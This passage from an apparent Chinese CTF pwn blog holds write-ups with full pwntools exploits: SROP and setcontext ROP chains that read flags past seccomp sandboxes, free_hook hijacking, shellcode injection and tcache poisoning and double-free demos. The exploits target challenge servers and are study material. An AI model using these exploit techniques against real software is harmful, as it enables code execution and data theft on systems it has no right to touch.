seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);    seccomp_load(ctx);    return 0;&#125;//沙盒int sys()&#123;    return 15;&#125;//syscallint main()&#123;     char bd[0x30];     seccomp();     syscall(1,1,buf,0x30); //write(&quot;welcome to NepCTF2023!\\n&quot;)     return syscall(0,0,bd,0x300);  //read(bd,0x300)&#125;//主函数\n查保护\npwndbg&gt; checksec[*] &#x27;/home/str1k3/Desktop/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n沙盒，但是允许了orw\npwndbg&gt; search flagSearching for value: &#x27;flag&#x27;libc-2.27.so    0x7ffff77d4a3b insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7505 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7906 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff79736a0 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff7979b44 insb byte ptr [rdi], dx /* &#x27;flags2 &amp; _IO_FLAGS2_FORTIFY&#x27; */libc-2.27.so    0x7ffff79b0282 &#x27;flags is not implemented and will always fail&#x27;warning: Unable to access 16003 bytes of target memory at 0x7ffff79b0286, halting search.warning: Unable to access 16003 bytes of target memory at 0x7ffff7bd1000, halting search.ld-2.27.so      0x7ffff7df6421 insb byte ptr [rdi], dx /* &#x27;flag)&#x27; */ld-2.27.so      0x7ffff7df6efe insb byte ptr [rdi], dx /* &#x27;flag value(s) of 0x%x in DT_FLAGS_1.\\n&#x27; */ld-2.27.so      0x7ffff7df77d4 insb byte ptr [rdi], dx /* &#x27;flags &amp; ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0&#x27; */ld-2.27.so      0x7ffff7df844e insb byte ptr [rdi], dx /* &#x27;flags_1 &amp; DF_1_NODELETE) == 0&#x27; */\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# io = process(&quot;./pwn&quot;)p = remote(&quot;nepctf.1cepeak.cn&quot;, 31943)mov_eax_15 = 0x0000400754   #0x0000000000400754 : mov eax, 0xf ; pop rbp ; retbuf = 0x00000601050         #.bss:0000000000601050ret = 0x004007AE            #.text:00000000004007AD C9                            leave                            #.text:00000000004007AE C3                            retnsyscall = 0x0004005B0       #.plt:00000000004005B0                               ; [00000006 BYTES: COLLAPSED FUNCTION _syscall. PRESS CTRL-NUMPAD+ TO EXPAND]pop_rdi = 0x0000000000400813    #0x0000000000400813 : pop rdi ; retstack = 0x0601a50#开出一个栈frame = SigreturnFrame()frame.rdi = 0frame.rsi = 0frame.rdx = stack-0x8frame.rcx = 0x1000frame.rip = syscallframe.rsp = stackpayload = b&quot;a&quot; * (0x0030+8) + flat([    pop_rdi,    15,    syscall]) + bytes(frame)p.send(payload)sleep(1)#orwframe = SigreturnFrame()frame.rdi = 2frame.rsi = stack-0x8frame.rdx = 0frame.rcx = 0x1000frame.rip = syscallframe.rsp = stack + 0x110payload = b&quot;./flag\\x00\\x00&quot; + flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 0frame.rsi = 3frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 1frame.rsi = 1frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) log.success(f&quot;length &#123;len(payload):#x&#125;&quot;)p.send(payload)p.interactive()","categories":["stack"],"tags":["rop"]},{"title":"setcontext","url":"/2023/09/28/setcontext/","content":"基于堆的orw由于沙箱机制的存在，不能使用onegadget或者system。此时我们就需要使用ROP链的方式构造orw。接下来问题就来了，虽然可以构造ROP链，但是怎么调用呢，ROP链需要设置栈上的参数，仅仅靠free_hook或者malloc_hook等钩子函数是无法利用的，因此也就有了setcontext。\n&lt;setcontext&gt;:     push   rdi&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]&lt;setcontext+8&gt;:   xor    edx,edx&lt;setcontext+10&gt;:  mov    edi,0x2&lt;setcontext+15&gt;:  mov    r10d,0x8&lt;setcontext+21&gt;:  mov    eax,0xe&lt;setcontext+26&gt;:  syscall &lt;setcontext+28&gt;:  pop    rdi&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]&lt;setcontext+44&gt;:  fldenv [rcx]&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]&lt;setcontext+94&gt;:  push   rcx&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]&lt;setcontext+125&gt;: xor    eax,eax&lt;setcontext+127&gt;: ret    &lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        &lt;setcontext+135&gt;: neg    eax&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff&lt;setcontext+144&gt;: ret\ntips:这里讲讲为什么不直接用而要用&lt;setcontext+53&gt;原因是执行到&lt;setcontext+44&gt;:  fldenv [rcx] 的时候程序会直接crash\n一般利用方式我们会将free_hook或者malloc_hook地址的内容覆盖为setcontext+53，最后再malloc或者free一下。这里程序流程可以解释如下：执行free或者malloc后跳转到setcontext+53，然后将rsp指针指向orw链，然后修改rcx的值为ret指令的地址，push rcx，至于其它寄存器的值此处可以不用在意，最后执行setcontext末尾后紧邻的retn，栈头出栈也还是ret指令，然后继续弹出，此时的rsp指向的地址正好是orw链的开头。  setcontext的具体操作也就是这样，这里最后再补充一个点，前面我们为了修改rsp和rcx的值需要找准偏移，一般我们可以手算一下，当然也可以利用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx。\nfrom pwn import *context.arch = &quot;amd64&quot;#这个必须要设置，同sropframe = SigreturnFrame()frame.rsp = 0xaaframe.rip = 0xbb\n看道例题吧~[CISCN 2021 初赛]silverwolfchecksec\n[*] &#x27;/home/str1k3/Desktop/silverwolf&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled\n存在沙盒\nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/home/str1k3/Desktop/silverwolf&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL\n\nNSS上给的是glibc2.27，据说当时发现是glibc2.29，环境可能不大一样，exp留给自己看\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./silverwolf&quot;)p = remote(&quot;node4.anna.nssctf.cn&quot;,28768)libc = ELF(&quot;./libc-2.27.so&quot;)def choice(choice):  p.recvuntil(&quot;choice: &quot;)  p.sendline(str(choice))def add(index,size):  choice(1)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  p.recvuntil(&quot;Size: &quot;)  p.sendline(str(size))  def edit(index,content):  choice(2)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  p.recvuntil(&quot;Content: &quot;)  p.sendline(content)  def show(index):  choice(3)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  def free(index):  choice(4)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))def clean():  for i in range(7):    add(0,0x78)  for i in range(12):    add(0,0x18)  for i in range(14):    add(0,0x68)  add(0,0x58)#沙盒会影响堆风水，简单恢复，具体不是很清楚呜呜呜clean()add(0,0x28)free(0)edit(0,p64(0)*2)free(0)add(0,0x28)show(0)p.recvuntil(&quot;Content: &quot;)heap_base = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;)) &amp; 0xFFFFFFFFFFFFF000-0x1000success(&quot;heap:&quot; + hex(heap_base))edit(0,p64(heap_base+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000))free(0)show(0)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53add(0,0x48)edit(0,p64(0)*9)add(0,0x18)edit(0,p64(heap_base+0x50))add(0,0x38)payload = p64(free_hook) #18payload += p64(heap_base + 0x2000) #28   payload += p64(heap_base + 0x20a0) #38      payload += p64(heap_base + 0x2000) #48payload += p64(heap_base + 0x1000) #58payload += p64(0) #68payload += p64(heap_base + 0x1000+0x58)#78edit(0,payload)pop_rax_ret = libc_base+0x0000000000043ae8pop_rdi_ret = libc_base+0x00000000000215bfpop_rsi_ret = libc_base+0x0000000000023eeapop_rdx_ret = libc_base+0x0000000000001b96ret = libc_base+0x0000000000023eebopen1 = libc_base + libc.sym[&#x27;open&#x27;]read = libc_base + libc.sym[&#x27;read&#x27;]write = libc_base + libc.sym[&#x27;write&#x27;]alarm = libc_base + libc.sym[&#x27;alarm&#x27;]syscall = alarm+0x5flag_addr = heap_base+0x2000success(&quot;libc base:%s&quot;, hex(libc_base))success(&quot;setcontext_53:%s&quot;, hex(setcontext))success(&quot;free_hook:%s&quot;, hex(free_hook))# rop chainrop = p64(pop_rdi_ret)+p64(flag_addr)rop += p64(pop_rsi_ret)+p64(0)rop += p64(pop_rax_ret)+p64(2)rop += p64(syscall)rop += p64(pop_rdi_ret)+p64(3)rop += p64(pop_rsi_ret)+p64(flag_addr)rop += p64(pop_rdx_ret)+p64(0x30)rop += p64(pop_rax_ret)+p64(0)rop += p64(syscall)rop += p64(pop_rdi_ret)+p64(1)rop += p64(pop_rsi_ret)+p64(flag_addr)rop += p64(pop_rdx_ret)+p64(0x30)rop += p64(pop_rax_ret)+p64(1)rop += p64(syscall)add(0,0x18)edit(0,p64(setcontext))  #hijack  free_hook  to setcontext+53add(0,0x28)edit(0,b&#x27;./flag\\x00\\x00&#x27;)  #./flag in heap + 0x2000  -- rdiadd(0,0x38)edit(0,p64(heap_base + 0x1000) + p64(ret))  # mov rsp , [rdi+0a0h]# rop in heap+0x10000add(0,0x58)edit(0,rop[:0x58])add(0,0x78)edit(0,rop[0x58:])# setcontext(rop)add(0,0x48)free(0)p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"the_Belt_and_Road_review","url":"/2023/10/24/the-Belt-and-Road-review/","content":"三个小时的理论+CTF，全打理论去了:(一带一路初赛题目附件orw_h1checksec\n└─$ checksec orw_h1[*] &#x27;/Desktop/pwn/orw_h1&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/fTF0Ly/orw_h1&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\ndelete存在UAF\nif ( v1 &lt;= 0x1E &amp;&amp; *((_QWORD *)&amp;unk_202060 + (int)v1) )&#123;  free(*((void **)&amp;unk_202060 + (int)v1));  puts(&quot;delete done.&quot;);&#125;\nglibc2.27\nfrom pwn import *#from LibcSearcher import*from ctypes import *from struct import packfrom pwn import u64,p64context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)one_gadget=[0x4f2a5,0x4f302,0x10a2fc]p = process(&#x27;./orw_h1&#x27;)#p = remote(&#x27;106.15.38.114&#x27;, 32832)elf = ELF(&#x27;./orw_h1&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)def debug():    gdb.attach(p)    pause()def add(size,idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;description:&#x27;,str(size))    p.sendlineafter(b&#x27;Game description:&#x27;,str(idx))def delete(idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx))def edit(idx1,idx2):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx1))    p.sendlineafter(b&#x27;Game description:&#x27;,str(idx2))def show(idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx))def exit():    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;5&#x27;)#先泄露libc地址add(0x80,&#x27;aaaa&#x27;) #1dx0add(0x130,&#x27;bbbb&#x27;) #idx1add(0x130,&#x27;bbbb&#x27;)#idx2for i in range(7):  add(128)for i in range(3, 10):  delete(i)delete(0)show(0)p.recv()libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53success(&quot;libc base:%s&quot;, hex(libc_base))success(&quot;setcontext_53:%s&quot;, hex(setcontext))success(&quot;free_hook:%s&quot;, hex(free_hook))#貌似gadgets找不齐，这里用官方wp的#打free_hook，利用setcontext开辟给shellcode的内存空间#来执行orw的shellcode#pop_rax_ret = libc_base+0x0000000000043ae8#pop_rdi_ret = libc_base+0x0000000000001193#pop_rsi_ret = libc_base+0x0000000000023eea#pop_rdx_ret = libc_base+0x0000000000001b96#ret = libc_base+0x0000000000000909#open1 = libc_base + libc.sym[&#x27;open&#x27;]#read = libc_base + libc.sym[&#x27;read&#x27;]#write = libc_base + libc.sym[&#x27;write&#x27;]#alarm = libc_base + libc.sym[&#x27;alarm&#x27;]#syscall = alarm+0x5#flag_addr = heap_base+0x2000newexe = free_hook &amp; 0xffffffffff000shellcode1 = &#x27;&#x27;&#x27;xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi&#x27;&#x27;&#x27;% newexe#伪造setcontextframe = SigreturnFrame()framersp = free_hook+0x10frame.rdi = newexeframe.rsi = 0x1000frame.rdx = 7frame.rip = libc.sym[&#x27;mprotect&#x27;]#随意找的orwshellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)delete(1)edit(1, p64(free_hook))add(0x130)payload = p64(setcontext+53)+p64(free_hook+0x18)*2+asm(shellcode1)add(0x130, payload)edit(2, str(frame))delete(2)p.sendline(shellcode2)p.interactive()\n\npwn0402啥都没开\n└─$ checksec pwn0402[*] &#x27;/Desktop/pwn0402&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments\n\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // edx  int v4; // ecx  int v5; // r8d  int v6; // r9d  char v8[132]; // [rsp+0h] [rbp-90h] BYREF  int v9; // [rsp+84h] [rbp-Ch]  int i; // [rsp+88h] [rbp-8h]  int j; // [rsp+8Ch] [rbp-4h]  init_0();  printf((unsigned int)&quot;secret: %p\\n&quot;, (unsigned int)v8, v3, v4, v5, v6, v8[0]);  length = read(0LL, v8, 296LL);//溢出  i = 0;  v9 = strlen(nosecurity_string);  for ( i = 0; i &lt; length; ++i )  &#123;    for ( j = 0; j &lt; v9; ++j )    &#123;      if ( nosecurity_string[j] == v8[i] )        exit(0LL);    &#125;  &#125;//检查，过滤了&#x27;CTctGFlagSNH/binsh&#x27;  return 0;&#125;\n根本不走检查:)\nfrom pwn import *#from LibcSearcher import*from ctypes import *from struct import packfrom pwn import u64,p64context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)p = process(&#x27;./pwn0402&#x27;)main = 0x400A05p.recvuntil(&#x27;secret: &#x27;)data = int(p.recvline(),16) #泄露溢出点位置rdx_rsi = 0x0000000000442b89 # pop rdx ; pop rsi ; retpop_rdi = 0x00000000004016e6gdb.attach(p,&#x27;b *0x0400ABF&#x27;)pause()success(&quot;v8:%s&quot;, hex(data))payload = b&#x27;&#x27;.ljust(0x98,b&#x27;\\x90&#x27;)#溢出payload += p64(rdx_rsi)payload += p64(0x100) + p64(data + 200)#== read (0,data+200,0x100)payload += p64(pop_rdi) payload += p64(0)payload += p64(0x0412ECB) #call_read p.sendline(payload)#gdb.attach(p)#pause()#现在调用read的rop链已经执行==现在再调用一次read#把shellcode写进去，整个栈都是可执行的p.sendline(p64(data+210)+b&#x27;\\x90&#x27;*20+asm(shellcraft.sh()))\n","categories":["wp"],"tags":["wp"]},{"title":"tcachebin_attack","url":"/2023/08/30/tcachebin-attack/","content":"about tcache在glibc版本2.26(可以简单记成18.04后)以后，加入了tcache(Thread Local Caching)机制\n这里放上tcache的定义\n#if USE_TCACHE/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */# define TCACHE_MAX_BINS        64# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables.  */# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize().  */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size.  */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are...   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)   idx 1   bytes 25..40 or 13..20   idx 2   bytes 41..56 or 21..28   etc.  *//* This is another arbitrary limit, which tunables can change.  Each   tcache bin will hold at most this number of chunks.  */# define TCACHE_FILL_COUNT 7#endif\ntcache机制通过维护多个大小不同的链表来存储已被释放但尚未重新分配的堆块。每个链表对应一个特定的堆块大小，并且每个线程都有自己的tcache链表。当程序请求分配一个堆块时，tcache会首先检查是否有合适大小的空闲块可用，如果有，则直接从tcache中分配给程序。\ntcache机制主要有三个优点：\n减少了对全局锁的竞争：由于每个线程都有自己的tcache链表，所以线程之间不需要竞争全局锁，从而减少了锁的开销。快速的内存分配和释放：由于tcache只包含已经释放但尚未重新分配的堆块，所以可以快速地进行内存分配和释放操作。减少碎片化：tcache机制使得相同大小的堆块可以被重复使用，减少了堆内存的碎片化问题。\n它为每个线程创建一个缓存，里面包含了一些小堆块。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache_bin中。对于每个tcache_bin单链表，它和fast_bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache_bin中的chunk不会被合并，即使和Top_chunk相邻。\n  另外tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache_bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache_bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache_bin中的fd指针是指向malloc返回的地址，也就是用户数据部分。\nattack绕过tcache机制的方法在上一篇unsorted_bin里有说明\ntcache poisoning\n//gcc how2heap2.c -g -no-pie -o tcache_bin#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    // 在fck处分配堆块    unsigned long fck;    printf(&quot;fck addr is %p\\n&quot;, &amp;fck);    unsigned long * ptr = malloc(0x80);//chunk1    printf(&quot;malloc ptr addr is %p\\n&quot;, ptr);    free(ptr);    // 只需修改fd指针，申请的大小和当前tcache bin大小相同即可    ptr[0] = (unsigned long)&amp;fck;    malloc(0x80);//chunk2    printf(&quot;the second malloc addr is %p\\n&quot;, malloc(0x80));    return 0;&#125;\n攻击效果如下\npwndbg&gt; rStarting program: /home/str1k3/Desktop/tcache_bin fck addr is 0x7fffffffe2e8malloc ptr addr is 0x602670the second malloc addr is 0x7fffffffe2e8[Inferior 1 (process 3147) exited normally]\n可以看到chunk2的地址被修改到了0x7fffffffe2e8。\ntcache house of spirit\n//gcc tcache_house_of_spirit.c -g -no-pie -o tcache_house_of_spirit#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    unsigned long target[4];    malloc(1);  // 初始化堆环境        // 伪造fake_chunk，试图释放后再次分配得到该地址的堆块    printf(&quot;your target addr is %p\\n&quot;, target+2);    target[1] = 0x90;    free(target+2);    printf(&quot;now malloc addr is %p\\n&quot;, malloc(0x80));    //success     return 0;&#125;\nfree完fake_chunk后的bin：\npwndbg&gt; bintcachebins0x90 [  1]: 0x7fffffffe2d0 ◂— 0x0\n成功得到位于0x7fffffffe2d0的堆块\n该攻击关键在于构造好fake_chunk的size，以及释放堆块对应的用户数据地址\nleak_libc_base同unsorted_bin_attack\nleak_heap_baseeasy_double_free\nglibc版本2.28前，没有对tcache二次释放的检查因此在glibc_2.26到glibc_2.27的老版本之间可以利用double_free来泄露堆基址\n//gcc double_free.c -g -no-pie -o double_free#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    unsigned long *ptr = malloc(0x80);    free(ptr);    free(ptr);  // double free    printf(&quot;heap addr is %ld\\n&quot;, ptr[0]);    return 0;&#125;\n这个过渡版的glibc有点难找，等环境搭起来再来复现easy_double_free\ndouble_free那么高版本的glibc能double_free吗？是可以的，先看看检查机制\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;  //指向chunk的fd  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;  //指向chunk的bk&#125; tcache_entry;\n对于每一个tcache都有一个key指针指向\nsize_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)    &#123;      /* Check to see if it&#x27;s already in the tcache.  */      tcache_entry *e = (tcache_entry *)chunk2mem(p);       /*        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来      */      if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息      &#123;        tcache_entry *tmp;        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)          if (tmp == e)            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);      &#125;       if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //通过检查，放入tcahce中      &#123;        tcache_put(p, tc_idx);        return;      &#125;    &#125;\n所以 如果我们还想要使用tcache double free的话 就只能修改key字段\ndebug_exp:\nfrom pwn import*p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))add(0x10,b&#x27;aaaa&#x27;)delete(0)debug()payload = p64(0)*2edit(0,len(payload),payload)delete(0)p.interactive\n\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0xe3d000Size: 0x251Free chunk (tcachebins) | PREV_INUSEAddr: 0xe3d250Size: 0x21fd: 0x00Top chunk | PREV_INUSEAddr: 0xe3d270Size: 0x20d91pwndbg&gt; x/4gx 0xe3d2500xe3d250:\t0x0000000000000000\t0x00000000000000210xe3d260:\t0x0000000000000000\t0x0000000000e3d010pwndbg&gt; x/4gx 0xe3d0000xe3d000:\t0x0000000000000000\t0x00000000000002510xe3d010:\t0x0000000000000001\t0x0000000000000000\n可以看到所谓的key检查 也就是在tcachebin中的chunk的bk域存入tcache_perthread_struct结构体的地址\n也就是在堆基址处0x251大小的chunk\n跟着exp走，可以成功把处于tcachebin中的chunk的bk域清空这样再次free的时候就不会触发double free\n[CISCN 2021 初赛]lonelywolf保护全开，四肢健全add仅能有一个chunk，最大size&#x3D;0x78 free存在UAF先考虑用一次double free来泄露堆地址\nadd(0x78)free()edit(p64(0)*2)free()show()p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x260\n第二次free前的结构double free后，该chunk的bk指向该chunk的地址，可用于泄露heapbase随后通过攻击tcache struct来分配一个0x250的堆块后使其进入unsorted bin来泄露libc\nedit(p64(heap_base + 0x10))add(0x78)add(0x78)edit(b&#x27;\\x00&#x27;*35 + b&#x27;\\x07&#x27;)free()show()libc_base = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]\n攻击造成的后果：后续再修改tcache struct来打freehook即可\nedit(b&#x27;\\x01\\x01&#x27; + b&#x27;\\xff&#x27;*0x3e + p64(free_hook) + p64(heap_base + 